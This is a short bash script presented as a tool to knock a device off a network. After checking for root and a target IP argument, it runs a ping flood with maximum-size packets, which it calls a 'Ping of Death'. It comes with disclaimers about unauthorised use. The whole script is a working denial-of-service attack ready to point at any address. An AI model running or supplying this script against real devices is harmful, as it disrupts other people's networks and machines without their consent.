#!/usr/bin/env /bin/bash

# A script to ban your computer from the network!
#
# Use it at you own risk! Never run this script on an
# unauthorised network.
#
# You are the only responsible for what you do with it.
#
# I WILL NOT TAKE ANY RESPONSIBILITY OF ANYTHING YOU
# DO WITH THIS SCRIPT

# Only superuser can do ping flooding
if [ $UID -ne 0 ]
then
    echo "Only superuser can execute this script! Be \'root\'!"
    exit 1;
fi

# Check arguments
if [ "$1" = "" ]
then
    echo "Usage: $0 <ip-of-a-device-in-network>";
    exit 1;
fi

# Ping flooding or "Ping of Death"
ping -f "$1" -s 65507